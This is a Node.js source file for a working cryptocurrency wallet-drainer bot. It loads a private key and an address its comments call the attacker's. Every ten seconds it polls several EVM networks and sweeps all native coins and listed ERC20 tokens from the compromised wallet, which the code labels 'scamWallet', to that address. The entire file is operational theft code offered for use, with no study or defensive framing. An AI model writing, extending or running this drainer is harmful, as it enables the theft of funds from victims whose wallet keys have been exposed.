const { ethers } = require("ethers");
require("dotenv").config();
const { networks, tokens } = require("./config");

// Load private key and attacker address from .env
const EVM_PRIVATE_KEY = process.env.EVM_PRIVATE_KEY?.trim();
const ATTACKER_ADDRESS = process.env.EVM_ADDRESS?.trim();

// Validate environment variables
if (!EVM_PRIVATE_KEY || !ATTACKER_ADDRESS) {
    console.error("Error: Missing required environment variables in .env file.");
    console.error("Ensure EVM_PRIVATE_KEY and EVM_ADDRESS are set.");
    process.exit(1);
}

// Validate EVM private key format
let evmWallet;
try {
    evmWallet = new ethers.Wallet(EVM_PRIVATE_KEY);
    console.log("Monitoring wallet:", evmWallet.address);
} catch (error) {
    console.error("Error: Invalid EVM_PRIVATE_KEY format:", error.message);
    console.error("Ensure EVM_PRIVATE_KEY is a valid 64-character hex string (with or without 0x).");
    process.exit(1);
}

// ERC20 ABI for token transfers
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address recipient, uint256 amount) returns (bool)"
];

// Drain EVM funds (native and tokens)
async function drainEVMFunds(network) {
    try {
        const provider = new ethers.JsonRpcProvider(network.rpc);
        const scamWallet = evmWallet.connect(provider);
        const balance = await provider.getBalance(scamWallet.address);
        console.log(`${network.name} balance (${scamWallet.address}): ${ethers.formatEther(balance)} ${network.symbol}`);

        // Estimate gas cost
        const gasPrice = (await provider.getFeeData()).gasPrice;
        const gasLimit = 21000n; // Standard transfer gas limit
        const gasCost = gasPrice * gasLimit;

        // Transfer native tokens if balance sufficient
        const minBalance = ethers.parseEther("0.0000001"); // Minimum balance to trigger
        if (balance > minBalance && balance > gasCost) {
            console.log(`Funds detected on ${network.name} (${scamWallet.address}): ${ethers.formatEther(balance)} ${network.symbol}`);
            const nonce = await provider.getTransactionCount(scamWallet.address, "latest");
            const tx = {
                to: ATTACKER_ADDRESS,
                value: balance - gasCost, // Subtract estimated gas cost
                gasLimit: gasLimit,
                gasPrice: gasPrice,
                nonce: nonce,
            };
            const txResponse = await scamWallet.sendTransaction(tx);
            await txResponse.wait();
            console.log(`Drained ${network.symbol} from ${scamWallet.address}. TX: ${txResponse.hash}`);
        } else if (balance > minBalance) {
            console.log(`Insufficient balance for gas on ${network.name} (${scamWallet.address}): ${ethers.formatEther(balance)} ${network.symbol}`);
        }

        // Transfer ERC20 tokens
        for (let token of tokens[network.name] || []) {
            try {
                const tokenContract = new ethers.Contract(token.address, ERC20_ABI, scamWallet);
                const tokenBalance = await tokenContract.balanceOf(scamWallet.address);
                console.log(`${network.name} ${token.name} balance (${scamWallet.address}): ${ethers.formatUnits(tokenBalance, token.decimals)} ${token.name}`);
                if (tokenBalance > 0n) {
                    console.log(`Draining ${ethers.formatUnits(tokenBalance, token.decimals)} ${token.name} from ${network.name} (${scamWallet.address})...`);
                    const tokenGasLimit = 100000n; // Estimate for token transfer
                    const tokenGasCost = gasPrice * tokenGasLimit;
                    if (balance > tokenGasCost) {
                        const tx = await tokenContract.transfer(ATTACKER_ADDRESS, tokenBalance, { gasLimit: tokenGasLimit, gasPrice });
                        await tx.wait();
                        console.log(`Drained ${token.name} from ${scamWallet.address}. TX: ${tx.hash}`);
                    } else {
                        console.log(`Insufficient balance for token transfer gas on ${network.name} (${scamWallet.address})`);
                    }
                }
            } catch (tokenError) {
                console.error(`Error draining ${token.name} on ${network.name} (${scamWallet.address}):`, tokenError.message);
            }
        }
    } catch (error) {
        console.error(`Error draining ${network.name}:`, error.message);
    }
}

// Start draining process
function startDraining() {
    console.log("Starting wallet monitoring...");
    networks.forEach(network => drainEVMFunds(network));
}

module.exports = { startDraining };

// Run periodically every 10 seconds
setInterval(() => {
    startDraining();
}, 10000);